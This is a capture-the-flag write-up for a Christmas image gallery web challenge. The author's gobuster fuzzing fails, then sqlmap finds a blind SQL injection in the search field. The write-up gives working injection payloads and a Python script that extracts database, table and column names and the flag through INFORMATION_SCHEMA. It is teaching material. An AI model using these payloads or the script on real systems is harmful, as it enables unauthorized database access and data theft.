# Image Gallery (web) (author: stn)

## Description

```shell
We've created a nice web image gallery to help people to get into a Christmas mood with some nice Christmas-themed pictures. Go and take a look.
```

## Task analysis & solution

Upon starting the docker instance and loading up the website in the browser, I'm greeted by an image gallery, consisting of 20 Christmas themed images. On the top of the page, there is a small input textbox that acts as a search.

![](1.png)

Let's explore the source of the page:

```html
<!-- Omitted for brevity -->
    <!-- Gallery -->
    <div class="container">
        <div class="top">


<ul><li><a href="#img_1"><img src="img/abstract-christmas-tree-illustration_23-2148778299.jpg"></a></li><li><a href="#img_2"><img src="img/black-background-with-reindeer_1110-610.jpg"></a></li><li><a href="#img_3"><img src="img/christmas-background-with-bauble-winter-landscape-design_1048-17200.avif"></a></li><li><a href="#img_4"><img src="img/christmas-card-with-christmas-tree-vector-illustration-eps-10_87521-3908.jpg"></a></li><li><a href="#img_5"><img src="img/christmas-greeting-template-vector-facebook-story-post-winter-holiday-season_53876-154350.avif"></a></li><li><a href="#img_6"><img src="img/christmas-holiday-template-facebook-story-post-winter-holiday-season-vector_53876-154352.avif"></a></li><li><a href="#img_7"><img src="img/christmas-new-year-card-with-watercolor-white-floral-red-christmas-ornament_44538-13680.avif"></a></li><li><a href="#img_8"><img src="img/flat-christmas-gnomes-collection_23-2149151493.avif"></a></li><li><a href="#img_9"><img src="img/flat-christmas-season-celebration-background_23-2149842695.avif"></a></li><li><a href="#img_10"><img src="img/hand-drawn-christmas-background-with-florals-ornaments_1361-4054.avif"></a></li><li><a href="#img_11"><img src="img/hand-drawn-christmas-stamp-collection_23-2148759439.avif"></a></li><li><a href="#img_12"><img src="img/hand-drawn-merry-christmas-decorative-background-design_1017-28933.avif"></a></li><li><a href="#img_13"><img src="img/merry-christmas-festival-celebration-greeting-background_1055-22426.avif"></a></li><li><a href="#img_14"><img src="img/merry-christmas-hand-drawn-card_53876-56284.avif"></a></li><li><a href="#img_15"><img src="img/merry-christmas-lettering-with-snowmans_23-2148292056.jpg"></a></li><li><a href="#img_16"><img src="img/minimal-christmas-background-with-blue-red-ornaments_1361-3038.avif"></a></li><li><a href="#img_17"><img src="img/modern-christmas-background-with-white-snowflakes_1361-3976.jpg"></a></li><li><a href="#img_18"><img src="img/retro-styled-christmas-card_1048-9207.jpg"></a></li><li><a href="#img_19"><img src="img/vintage-christmas-decoration-background_23-2147708708.jpg"></a></li><li><a href="#img_20"><img src="img/watercolor-christmas-element-collection-characters_759171-30.jpg"></a></li></ul><a href="#_1" class="lightbox" id=img_1><img src="img/abstract-christmas-tree-illustration_23-2148778299.jpg"></a><a href="#_2" class="lightbox" id=img_2><img src="img/black-background-with-reindeer_1110-610.jpg"></a><a href="#_3" class="lightbox" id=img_3><img src="img/christmas-background-with-bauble-winter-landscape-design_1048-17200.avif"></a><a href="#_4" class="lightbox" id=img_4><img src="img/christmas-card-with-christmas-tree-vector-illustration-eps-10_87521-3908.jpg"></a><a href="#_5" class="lightbox" id=img_5><img src="img/christmas-greeting-template-vector-facebook-story-post-winter-holiday-season_53876-154350.avif"></a><a href="#_6" class="lightbox" id=img_6><img src="img/christmas-holiday-template-facebook-story-post-winter-holiday-season-vector_53876-154352.avif"></a><a href="#_7" class="lightbox" id=img_7><img src="img/christmas-new-year-card-with-watercolor-white-floral-red-christmas-ornament_44538-13680.avif"></a><a href="#_8" class="lightbox" id=img_8><img src="img/flat-christmas-gnomes-collection_23-2149151493.avif"></a><a href="#_9" class="lightbox" id=img_9><img src="img/flat-christmas-season-celebration-background_23-2149842695.avif"></a><a href="#_10" class="lightbox" id=img_10><img src="img/hand-drawn-christmas-background-with-florals-ornaments_1361-4054.avif"></a><a href="#_11" class="lightbox" id=img_11><img src="img/hand-drawn-christmas-stamp-collection_23-2148759439.avif"></a><a href="#_12" class="lightbox" id=img_12><img src="img/hand-drawn-merry-christmas-decorative-background-design_1017-28933.avif"></a><a href="#_13" class="lightbox" id=img_13><img src="img/merry-christmas-festival-celebration-greeting-background_1055-22426.avif"></a><a href="#_14" class="lightbox" id=img_14><img src="img/merry-christmas-hand-drawn-card_53876-56284.avif"></a><a href="#_15" class="lightbox" id=img_15><img src="img/merry-christmas-lettering-with-snowmans_23-2148292056.jpg"></a><a href="#_16" class="lightbox" id=img_16><img src="img/minimal-christmas-background-with-blue-red-ornaments_1361-3038.avif"></a><a href="#_17" class="lightbox" id=img_17><img src="img/modern-christmas-background-with-white-snowflakes_1361-3976.jpg"></a><a href="#_18" class="lightbox" id=img_18><img src="img/retro-styled-christmas-card_1048-9207.jpg"></a><a href="#_19" class="lightbox" id=img_19><img src="img/vintage-christmas-decoration-background_23-2147708708.jpg"></a><a href="#_20" class="lightbox" id=img_20><img src="img/watercolor-christmas-element-collection-characters_759171-30.jpg"></a>        </div>
    </div>
    <!-- Gallery -->

</body>

</html>
```

What we gather from this is that all the images are inside an ``img/`` folder at the root of the website. The search field looks like a very good attack vector and judging by where the pictures are coming from, my assumption would be that there is some possibility to do directory traversal and grab the flag from an adjacent folder or even somewhere outside of the web server. At the same time though, I tried some sample inputs for the search and there are a few things I noticed. Searching by the image extension (.jpg/.avif) did not yield any results and neither did a search for a dash (-). Funnily enough, if I looked for ``merry christmas`` I would get matches, but searching for ``merry-christmas`` was a no go. So whatever technique that functionality was employing, was sanitizing the input to an extend. If the website's backend was explicitly looking for pictures, even if manage to traverse the outer directories, unless the flag is an image file, I wouldn't be able to get it..

To explore my directory traversal idea, I grabbed a tool called [gobuster](https://github.com/OJ/gobuster). It is a fuzzing tool meant to brute force and find website security holes by doing dictionary attacks. Some of the commands I used were..

```shell
> .\gobuster.exe fuzz -u http://10.10.8.61:33333?search=FUZZ -w ..\deep_traversal.txt --exclude-length 998 -q
> .\gobuster.exe fuzz -u http://10.10.8.61:33333?search=FUZZ -w ..\deep_traversal.txt --exclude-length 998 -q
> .\gobuster.exe fuzz -u http://10.10.8.61:33333?search=FUZZ -w ..\deep_traversal.txt      
> .\gobuster.exe fuzz -u http://10.10.8.61:33333?search=FUZZ -w ..\dotdotpwn.txt -l      
> .\gobuster.exe fuzz -u http://10.10.8.61:33333?search=FUZZ -w ..\dotdotpwn.txt           
> .\gobuster.exe fuzz -u http://10.10.8.61:33333?search=FUZZ -w ..\dotdotpwn.txt -q        
> .\gobuster.exe dir -u http://10.10.8.61:33333 -w ..\big.txt -q                           
> .\gobuster.exe dir -u http://10.10.8.61:33333 -w ..\common.txt -q                      
> .\gobuster.exe dir -u http://10.10.8.61:33333 -w ..\directory_traversal_unix.txt  
```

``--exclude-length 998`` was used, because the normal 0 results view was at that length and I wanted to filter out results below that threshold. The ``-w`` parameter is used to specify a wordlist file and the values are then substituting the ``FUZZ`` string in the URL. Unfortunately, none of these proved useful or helped in any way. I wasn't able to get through.

Then I looked through the image files. The AV1 files were interesting. That's a modern encoding standard and it is not heard of in the CTF lands, thus very unlikely to have hidden data inside. I figured out that all of the pictures were grabbed from a website called freepik and so my lead here was getting cold.

Despite my better judgement and the fact that it makes no sense to have a database backing up this website, I decided to explore the possibility of doing SQL injections with the search field. I fired up [sqlmap](), which is a tool for testing sql vulnerabilities and crafted a command to explore the search functionality:

```shell
sqlmap -v5 -u http://10.10.8.61:33333/?search=christmas -p search -technique=B --level=5 --risk=3
```

The output I got this time was very positive though, to my utter amazement:

```shell
[15:14:39] [DEBUG] declared web page charset 'utf-8'
[15:14:39] [TRAFFIC IN] HTTP response [#1] (200 OK):
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1240
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.8.61:33333/?search=christmas
[15:14:39] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=red%' AND 2563=2563 AND 'dummy%'='dummy
    Vector: AND [INFERENCE]
---
[15:14:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL 5 (MariaDB fork)
```

I got two very important pieces of information from ``sqlmap``, first the database is mysql and second, the backend is susceptible to boolean based blind sql injections. But what does that mean? It means that we can plug ourselves into the select condition and try to blindly determine things based on whether we got results or not. Let's assume the following query is executed on the database when we search for ``christmas``:

```sql
SELECT X, Y, Z FROM images
WHERE name LIKE '<search input here>'
```

Thus if we search for ``christmas' AND 1=1``, then we should be getting the same results, as we're still providing a ``TRUE`` value in there. We can use this to our advantage and figure out information from within the database. There's one problem - we have no idea what the database looks like, how many tables it contains, hell, we don't even know what it is called. Luckily, every RDBMS has a system database called INFORMATION_SCHEMA that holds information about the databases, tables, columns etc. With a carefully crafted query, we can start our blind journey through this MySQL.

The idea is simple - we need a query to iterate through the table with the database names and then iterate on each result, character by character comparing that to known alphabetical symbols. If we get a result, then we have a letter and we can move on, otherwise we cycle through the alphabet until we do.

We know the database names can be found in INFORMATION_SCHEMA.SCHEMATA, thus we can craft this query to use as a condition:

```sql
SELECT SUBSTRING(SCHEMA_NAME, {position}, 1) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET {row_offset}) = '{char}
```

``{position}`` is the variable for the position within the database name that SUBSTRING by
``{row_offset}`` would hold the index of the currently processed database name
``{char}`` is the current letter we're trying

This can actually be made into a little script that will automate the processing for us, as it would be extremely time inefficient to be doing this by hand:

```python
import requests

url = "http://10.10.8.61:33333/?search="
alphabet = "abcdefghijklmnopqrstuvwxyz0123456789/._-{}"
results = []

for row_offset in range(0, 100):  # Iterate through rows
    path_value = ""
    for position in range(1, 100):  # Iterate through characters of the path
        for char in alphabet:
            
            # databases
            payload = f"christmas%25%27+AND+%28SELECT+SUBSTRING%28SCHEMA_NAME%2C+{position}%2C+1%29+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+1+OFFSET+{row_offset}%29+%3D+%27{char}%27+AND+%27red%25%27+%3D+%27red"
            
            response = requests.get(url + payload)
            
            # Check if the response contains <ul> to validate the query
            if "<ul>" in response.text:
                path_value += char
                print(f"Row {row_offset}, Character {position}: {char}")
                break
        else:
            # Stop if no match is found (end of the string)
            break
    
    # Stop if no path is found for the current row
    if not path_value:
        print(f"No more rows found after row {row_offset}")
        break

    # Append the extracted path value to the list
    results.append(path_value)

# Print all extracted paths
print("Extracted results:")
for idx, result in enumerate(results):
    print(f"Row {idx}: {result}")
```

It takes some time, because every single line needs to be checked index by index, but eventually we get some meaningful output:

```shell
No more rows found after row 5
Extracted results:
Row 0: information_schema
Row 1: performance_schema
Row 2: sys
Row 3: mysql
Row 4: ctfdb
```

These are databases on the mysql instance. Obviously, the one we should be looking into is ``ctfdb``. Let's modify the query a bit, so we can look through the tables of that particular database:

```shell
red%' AND (SELECT SUBSTRING(TABLE_NAME, {position}, 1) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='ctfdb' LIMIT 1 OFFSET {row_offset}) = '{char}' AND 'red%' = 'red
```

This will use the same technique, but this times select on INFORMATION_SCHEMA.TABLES for database ``ctfdb``.

```shell
No more rows found after row 2
Extracted results:
Row 0: secrets
Row 1: images
```

Would you look at that! We have a table called ``images`` and a table called ``secrets``. Let's look into the ``secrets`` table now:

```shell
red%' AND (SELECT SUBSTRING(column_name, {position}, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='ctfdb' AND table_name='secrets' LIMIT 1 OFFSET {row_offset}) = '{char}' AND 'red%' = 'red
```

This should print out all the columns of the ``secrets`` table inside the ``ctfdb`` database.

```shell
Extracted results:
Row 0: id
Row 1: flag
```

Now we know there's a flag column in the ``secrets`` table. One final query should be enough to take it home.

```shell
red%' AND (SELECT SUBSTRING(flag, {position}, 1) FROM secrets LIMIT 1 OFFSET {row_offset}) = '{char}' AND 'pesho%' = 'pesho
```

```shell
No more rows found after row 1
Extracted results:
Row 0: milestonectf{sql-injection-can-be-prevented}
```

And there we go, we got to the flag: **``milestonectf{sql-injection-can-be-prevented}``**